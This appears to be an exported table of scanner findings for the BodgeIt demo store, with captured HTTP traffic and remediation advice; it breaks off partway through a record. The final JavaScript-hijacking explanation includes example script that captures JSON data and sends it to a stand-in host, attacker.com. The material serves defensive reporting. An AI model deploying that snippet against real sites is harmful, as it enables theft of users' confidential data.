href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Login</h3> Please enter your credentials: <br/><br/> <form method=""POST""> <center> <table> <tr> <td>Username:</td> <td><input id=""username"" name=""username""></input></td> </tr> <tr> <td>Password:</td> <td><input id=""password"" name=""password"" type=""password""></input></td> </tr> <tr> <td></td> <td><input id=""submit"" type=""submit"" value=""Login""></input></td> </tr> </table> </center> </form> If you dont have an account with us then please <a href=""register.jsp"">Register</a> now for a free account. <br/><br/> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","The page contains a form with the following action URL:<ul><li>http://localhost:8080/bodgeit/login.jsp</li></ul>The form contains the following password field with autocomplete enabled:<ul><li>password</li></ul> Issue Background: <p>Most browsers have a facility to remember user credentials that are entered into HTML forms. This function can be configured by the user and also by applications that employ user credentials. If the function is enabled, then credentials entered by the user are stored on their local computer and retrieved by the browser on future visits to the same application.</p> <p>The stored credentials can be captured by an attacker who gains control over the user's computer. Further, an attacker who finds a separate application vulnerability such as cross-site scripting may be able to exploit this to retrieve a user's browser-stored credentials. </p>","<p>To prevent browsers from storing credentials entered into HTML forms, include the attribute <b>autocomplete=""off""</b> within the FORM tag (to protect all form fields) or within the relevant INPUT tags (to protect specific individual fields).</p> <p>Please note that modern web browsers may ignore this directive. In spite of this there is a chance that not disabling autocomplete may cause problems obtaining PCI compliance.</p>","","",""
"DemoApps","","Bodgeit","72","Password field with autocomplete enabled","","Low","Open","2015-10-15","Burp Suite Pro","525","Information Exposure Through Browser Caching","","/bodgeit/register.jsp","","","http://localhost:8080/bodgeit/register.jsp","","GET /bodgeit/register.jsp HTTP/1.1 Host: localhost:8080 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Referer: http://localhost:8080/bodgeit/login.jsp Cookie: JSESSIONID=09FC047A85CCCAD05A8F9B3FB787FF32; b_id=2","HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 2485 Date: Mon, 28 Mar 2016 20:11:16 GMT Connection: close <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Register</h3> Please enter the following details to register with us: <br/><br/> <form method=""POST""> <center> <table> <tr> <td>Username (your email address):</td> <td><input id=""username"" name=""username""></input></td> </tr> <tr> <td>Password:</td> <td><input id=""password1"" name=""password1"" type=""password""></input></td> </tr> <tr> <td>Confirm Password:</td> <td><input id=""password2"" name=""password2"" type=""password""></input></td> </tr> <tr> <td></td> <td><input id=""submit"" type=""submit"" value=""Register""></input></td> </tr> </table> </center> </form> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","The page contains a form with the following action URL:<ul><li>http://localhost:8080/bodgeit/register.jsp</li></ul>The form contains the following password fields with autocomplete enabled:<ul><li>password1</li><li>password2</li></ul> Issue Background: <p>Most browsers have a facility to remember user credentials that are entered into HTML forms. This function can be configured by the user and also by applications that employ user credentials. If the function is enabled, then credentials entered by the user are stored on their local computer and retrieved by the browser on future visits to the same application.</p> <p>The stored credentials can be captured by an attacker who gains control over the user's computer. Further, an attacker who finds a separate application vulnerability such as cross-site scripting may be able to exploit this to retrieve a user's browser-stored credentials. </p>","<p>To prevent browsers from storing credentials entered into HTML forms, include the attribute <b>autocomplete=""off""</b> within the FORM tag (to protect all form fields) or within the relevant INPUT tags (to protect specific individual fields).</p> <p>Please note that modern web browsers may ignore this directive. In spite of this there is a chance that not disabling autocomplete may cause problems obtaining PCI compliance.</p>","","",""
"DemoApps","","Bodgeit","144","System Information Leak: HTML Comment in JSP","","Low","Open","2015-10-15","Fortify SCA","615","Information Exposure Through Comments","","root/advanced.jsp","","","http://localhost/root/advanced.jsp","","","","Abstract: <Content><Paragraph>Any information revealed in the HTML comment at <Replace key=""PrimaryLocation.file""/> line <Replace key=""PrimaryLocation.line""/> could help an adversary learn about the system and form a plan of attack.<AltParagraph>Any information revealed in an HTML comment might help an adversary learn about the system and form a plan of attack.</AltParagraph></Paragraph></Content> Explanation: <Content>HTML comments provide an attacker with an easy source of information about a dynamically generated web page. <b>Example 1:</b> <pre> &lt;!-- TBD: this needs a security audit --&gt; &lt;form method=""POST"" action=""recalcOrbit""&gt; ... </pre> Even comments that seem innocuous may be useful to someone trying to understand the way the system is built.</Content>","Recommendations: <Content>Replace HTML comments with JSP comments (which will not be transmitted to the user). <b>Example 2:</b> The previous example is rewritten to use JSP comments, which will not be displayed to the user. <pre> &lt;%-- TBD: this needs a security audit --%&gt; &lt;form method=""POST"" action=""recalcOrbit""&gt; ... </pre></Content>","","",""
"DemoApps","","Bodgeit","184","System Information Leak: HTML Comment in JSP","","Low","Open","2015-10-15","Fortify SCA","615","Information Exposure Through Comments","","root/header.jsp","","","http://localhost/root/header.jsp","","","","Abstract: <Content><Paragraph>Any information revealed in the HTML comment at <Replace key=""PrimaryLocation.file""/> line <Replace key=""PrimaryLocation.line""/> could help an adversary learn about the system and form a plan of attack.<AltParagraph>Any information revealed in an HTML comment might help an adversary learn about the system and form a plan of attack.</AltParagraph></Paragraph></Content> Explanation: <Content>HTML comments provide an attacker with an easy source of information about a dynamically generated web page. <b>Example 1:</b> <pre> &lt;!-- TBD: this needs a security audit --&gt; &lt;form method=""POST"" action=""recalcOrbit""&gt; ... </pre> Even comments that seem innocuous may be useful to someone trying to understand the way the system is built.</Content>","Recommendations: <Content>Replace HTML comments with JSP comments (which will not be transmitted to the user). <b>Example 2:</b> The previous example is rewritten to use JSP comments, which will not be displayed to the user. <pre> &lt;%-- TBD: this needs a security audit --%&gt; &lt;form method=""POST"" action=""recalcOrbit""&gt; ... </pre></Content>","","",""
"DemoApps","","Bodgeit","175","Password Management: Password in Comment","","Low","Open","2015-10-15","Fortify SCA","615","Information Exposure Through Comments","","root/js/jquery-1.6.4.min.js","","","http://localhost/root/js/jquery-1.6.4.min.js","","","","Abstract: <Content>Storing passwords or password details in plaintext anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.</Content> Explanation: <Content>It is never a good idea to hardcode a password. Storing password details within comments is equivalent to hardcoding passwords. Not only does it allow all of the project's developers to view the password, it also makes fixing the problem extremely difficult. Once the code is in production, the password is now leaked to the outside world and cannot be protected or changed without patching the software. If the account protected by the password is compromised, the owners of the system will be forced to choose between security and availability. <Paragraph> In this case the password details appear in the comment in <Replace key=""PrimaryLocation.file""/> at line <Replace key=""PrimaryLocation.line""/>. </Paragraph> <b>Example:</b> The following comment specifies the default password to connect to a database: <pre> ... // Default username for database connection is ""scott"" // Default password for database connection is ""tiger"" ... </pre> This code will run successfully, but anyone who has access to it will have access to the password. Once the program has shipped, there is no going back from the database user ""scott"" with a password of ""tiger"" unless the program is patched. A devious employee with access to this information can use it to break into the system.</Content>","Recommendations: <Content>Passwords should never be hardcoded and should generally be obfuscated and managed in an external source. Storing passwords in plaintext anywhere on the system allows anyone with sufficient permissions to read and potentially misuse the password.</Content> Tips: 1.Avoid hardcoding passwords in source code and avoid using default passwords. If a hardcoded password is the default, require that it be changed and remove it from the source code.","","",""
"DemoApps","","Bodgeit","100","Body Parameters Accepted in Query","","Low","Open","2015-10-15","IBM Security AppScan Standard","598","Information Exposure Through Query Strings in GET Request","","/bodgeit/basket.jsp","basket.jsp","","http://localhost/bodgeit/basket.jsp","Method: POST -> GET","GET /bodgeit/basket.jsp?quantity_11=1&update=Update+Basket HTTP/1.1 Content-Type: application/x-www-form-urlencoded Cookie: JSESSIONID=3763D53CDAE983CDB47BA36052AD7B31; b_id=3 Accept-Language: en-US Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Referer: http://localhost:8080/bodgeit/basket.jsp Host: localhost:8080 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0) HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 3298 Date: Thu, 15 Oct 2015 22:22:08 GMT <script type=""text/javascript""> function incQuantity (prodid) { var q = document.getElementById('quantity_' + prodid); if (q != null) { var val = ++q.value; if (val > 12) { val = 12; } q.value = val; } } function decQuantity (prodid) { var q = document.getElementById('quantity_' + prodid); if (q != null) { var val = --q.value; if (val < 0) { val = 0; } q.value = val; } } </script> <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Your Basket</h3> <p style=""color:green"">Your basket had been updated.</p><br/> <form action=""basket.jsp"" method=""post""> <table border=""1"" class=""border"" width=""80%""> <tr><th>Product</th><th>Quantity</th><th>Price</th><th>Total</th></tr> <tr> <td><a href=""product.jsp?prodid=11"">TGJ CCC</a></td> <td style=""text-align: center"">&nbsp;<a href=""#"" onclick=""decQuantity(11);""><img src=""images/130.png"" alt=""Decrease quantity in basket"" border=""0""></a>&nbsp;<input id=""quantity_11"" name=""quantity_11"" value=""1"" maxlength=""2"" size = ""2"" style=""text-align: right"" READONLY />&nbsp;<a href=""#"" onclick=""incQuantity(11);""><img src=""images/129.png"" alt=""Increase quantity in basket"" border=""0""></a>&nbsp;</td> <td align=""right"">$0.70</td> </td><td align=""right"">$0.70</td> </tr> <tr><td>Total</td><td style=""text-align: center""><input id=""update"" name=""update"" type=""submit"" value=""Update Basket""/></td><td>&nbsp;</td><td align=""right"">$0.70</td></tr> </table> </form> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","","The test result seems to indicate a vulnerability because the Test Response is similar to the Original Response, indicating that the application processed body parameters that were submitted in the query","<fixRecommendations> <fixRecommendation type=""General""> <text>Re-program the application to disallow handling of POST parameters that were listed in the Query</text> </fixRecommendation>","","",""
"DemoApps","","Bodgeit","76","Body Parameters Accepted in Query","","Low","Open","2015-10-15","IBM Security AppScan Standard","598","Information Exposure Through Query Strings in GET Request","","/bodgeit/contact.jsp","contact.jsp","","http://localhost/bodgeit/contact.jsp","Method: POST -> GET","GET /bodgeit/contact.jsp?null=&anticsrf=0.17311905722928855&comments=1234 HTTP/1.1 Content-Type: application/x-www-form-urlencoded Cookie: JSESSIONID=3763D53CDAE983CDB47BA36052AD7B31 Accept-Language: en-US Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Referer: http://localhost:8080/bodgeit/contact.jsp Host: localhost:8080 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0) HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 2351 Date: Thu, 15 Oct 2015 22:22:06 GMT <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Contact Us</h3> Please send us your feedback: <br/><br/> <form method=""POST""> <input type=""hidden"" id=""user"" name=""null"" value=""""/> <input type=""hidden"" id=""anticsrf"" name=""anticsrf"" value=""0.7891658371585705""></input> <center> <table> <tr> <td><textarea id=""comments"" name=""comments"" cols=80 rows=8></textarea></td> </tr> <tr> <td><input id=""submit"" type=""submit"" value=""Submit""></input></td> </tr> </table> </center> </form> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","","The test result seems to indicate a vulnerability because the Test Response is similar to the Original Response, indicating that the application processed body parameters that were submitted in the query","<fixRecommendations> <fixRecommendation type=""General""> <text>Re-program the application to disallow handling of POST parameters that were listed in the Query</text> </fixRecommendation>","","",""
"DemoApps","","Bodgeit","104","Body Parameters Accepted in Query","","Low","Open","2015-10-15","IBM Security AppScan Standard","598","Information Exposure Through Query Strings in GET Request","","/bodgeit/login.jsp","login.jsp","","http://localhost/bodgeit/login.jsp","Method: POST -> GET","GET /bodgeit/login.jsp?username=&password= HTTP/1.1 Content-Type: application/x-www-form-urlencoded Cookie: JSESSIONID=3763D53CDAE983CDB47BA36052AD7B31 Accept-Language: en-US Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Referer: http://localhost:8080/bodgeit/login.jsp Host: localhost:8080 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0) HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 2470 Date: Thu, 15 Oct 2015 22:22:01 GMT <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Login</h3> Please enter your credentials: <br/><br/> <form method=""POST""> <center> <table> <tr> <td>Username:</td> <td><input id=""username"" name=""username""></input></td> </tr> <tr> <td>Password:</td> <td><input id=""password"" name=""password"" type=""password""></input></td> </tr> <tr> <td></td> <td><input id=""submit"" type=""submit"" value=""Login""></input></td> </tr> </table> </center> </form> If you dont have an account with us then please <a href=""register.jsp"">Register</a> now for a free account. <br/><br/> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","","The test result seems to indicate a vulnerability because the Test Response is similar to the Original Response, indicating that the application processed body parameters that were submitted in the query","<fixRecommendations> <fixRecommendation type=""General""> <text>Re-program the application to disallow handling of POST parameters that were listed in the Query</text> </fixRecommendation>","","",""
"DemoApps","","Bodgeit","109","Body Parameters Accepted in Query","","Low","Open","2015-10-15","IBM Security AppScan Standard","598","Information Exposure Through Query Strings in GET Request","","/bodgeit/register.jsp","register.jsp","","http://localhost/bodgeit/register.jsp","Method: POST -> GET","GET /bodgeit/register.jsp?username=&password1=&password2= HTTP/1.1 Content-Type: application/x-www-form-urlencoded Cookie: JSESSIONID=3763D53CDAE983CDB47BA36052AD7B31 Accept-Language: en-US Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Referer: http://localhost:8080/bodgeit/register.jsp Host: localhost:8080 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0) HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 2493 Date: Thu, 15 Oct 2015 22:22:06 GMT <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Register</h3> Please enter the following details to register with us: <br/><br/> <form method=""POST""> <center> <table> <tr> <td>Username (your email address):</td> <td><input id=""username"" name=""username""></input></td> </tr> <tr> <td>Password:</td> <td><input id=""password1"" name=""password1"" type=""password""></input></td> </tr> <tr> <td>Confirm Password:</td> <td><input id=""password2"" name=""password2"" type=""password""></input></td> </tr> <tr> <td></td> <td><input id=""submit"" type=""submit"" value=""Register""></input></td> </tr> </table> </center> </form> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","","The test result seems to indicate a vulnerability because the Test Response is similar to the Original Response, indicating that the application processed body parameters that were submitted in the query","<fixRecommendations> <fixRecommendation type=""General""> <text>Re-program the application to disallow handling of POST parameters that were listed in the Query</text> </fixRecommendation>","","",""
"DemoApps","","Bodgeit","223","JavaScript Hijacking","","Low","Open","2015-10-15","Fortify SCA","345","Insufficient Verification of Data Authenticity","","root/advanced.jsp","","","http://localhost/root/advanced.jsp","","","","Abstract: <Content>Applications that use JavaScript notation to transport sensitive data can be vulnerable to JavaScript hijacking, which allows an unauthorized attacker to read confidential data from a vulnerable application.</Content> Explanation: <Content>An application may be vulnerable to JavaScript hijacking if it: 1) Uses JavaScript objects as a data transfer format 2) Handles confidential data. Because JavaScript hijacking vulnerabilities do not occur as a direct result of a coding mistake, the HPE Security Fortify Secure Coding Rulepacks call attention to potential JavaScript hijacking vulnerabilities by identifying code that appears to generate JavaScript in an HTTP response. Web browsers enforce the Same Origin Policy in order to protect users from malicious websites. The Same Origin Policy requires that, in order for JavaScript to access the contents of a web page, both the JavaScript and the web page must originate from the same domain. Without the Same Origin Policy, a malicious website could serve up JavaScript that loads sensitive information from other websites using a client's credentials, cull through it, and communicate it back to the attacker. JavaScript hijacking allows an attacker to bypass the Same Origin Policy in the case that a web application uses JavaScript to communicate confidential information. The loophole in the Same Origin Policy is that it allows JavaScript from any website to be included and executed in the context of any other website. Even though a malicious site cannot directly examine any data loaded from a vulnerable site on the client, it can still take advantage of this loophole by setting up an environment that allows it to witness the execution of the JavaScript and any relevant side effects it may have. Since many Web 2.0 applications use JavaScript as a data transport mechanism, they are often vulnerable while traditional web applications are not. The most popular format for communicating information in JavaScript is JavaScript Object Notation (JSON). The JSON RFC defines JSON syntax to be a subset of JavaScript object literal syntax. JSON is based on two types of data structures: arrays and objects. Any data transport format where messages can be interpreted as one or more valid JavaScript statements is vulnerable to JavaScript hijacking. JSON makes JavaScript hijacking easier by the fact that a JSON array stands on its own as a valid JavaScript statement. Since arrays are a natural form for communicating lists, they are commonly used wherever an application needs to communicate multiple values. Put another way, a JSON array is directly vulnerable to JavaScript hijacking. A JSON object is only vulnerable if it is wrapped in some other JavaScript construct that stands on its own as a valid JavaScript statement. <b>Example 1:</b> The following example begins by showing a legitimate JSON interaction between the client and server components of a web application used to manage sales leads. It goes on to show how an attacker can mimic the client and gain access to the confidential data the server returns. Note that this example is written for Mozilla-based browsers. Other mainstream browsers do not allow native constructors to be overridden when an object is created without the use of the new operator. The client requests data from a server and evaluates the result as JSON with the following code: <pre> var object; var req = new XMLHttpRequest(); req.open(""GET"", ""/object.json"",true); req.onreadystatechange = function () { if (req.readyState == 4) { var txt = req.responseText; object = eval(""("" + txt + "")""); req = null; } }; req.send(null); </pre> When the code runs, it generates an HTTP request that looks like this: <pre> GET /object.json HTTP/1.1 ... Host: www.example.com Cookie: JSESSIONID=F2rN6HopNzsfXFjHX1c5Ozxi0J5SQZTr4a5YJaSbAiTnRR </pre> (In this HTTP response and the one that follows we have elided HTTP headers that are not directly relevant to this explanation.) The server responds with an array in JSON format: <pre> HTTP/1.1 200 OK Cache-control: private Content-Type: text/javascript; charset=utf-8 ... [{""fname"":""Brian"", ""lname"":""Chess"", ""phone"":""6502135600"", ""purchases"":60000.00, ""email"":""brian@fortifysoftware.com"" }, {""fname"":""Katrina"", ""lname"":""O'Neil"", ""phone"":""6502135600"", ""purchases"":120000.00, ""email"":""katrina@fortifysoftware.com"" }, {""fname"":""Jacob"", ""lname"":""West"", ""phone"":""6502135600"", ""purchases"":45000.00, ""email"":""jacob@fortifysoftware.com"" }] </pre> In this case, the JSON contains confidential information associated with the current user (a list of sales leads). Other users cannot access this information without knowing the user's session identifier. (In most modern web applications, the session identifier is stored as a cookie.) However, if a victim visits a malicious website, the malicious site can retrieve the information using JavaScript hijacking. If a victim can be tricked into visiting a web page that contains the following malicious code, the victim's lead information will be sent to the attacker's web site. <pre> &lt;script&gt; // override the constructor used to create all objects so // that whenever the ""email"" field is set, the method // captureObject() will run. Since ""email"" is the final field, // this will allow us to steal the whole object. function Object() { this.email setter = captureObject; } // Send the captured object back to the attacker's Web site function captureObject(x) { var objString = """"; for (fld in this) { objString += fld + "": "" + this[fld] + "", ""; } objString += ""email: "" + x; var req = new XMLHttpRequest(); req.open(""GET"", ""http://attacker.com?obj="" + escape(objString),true); req.send(null); } &lt;/script&gt; 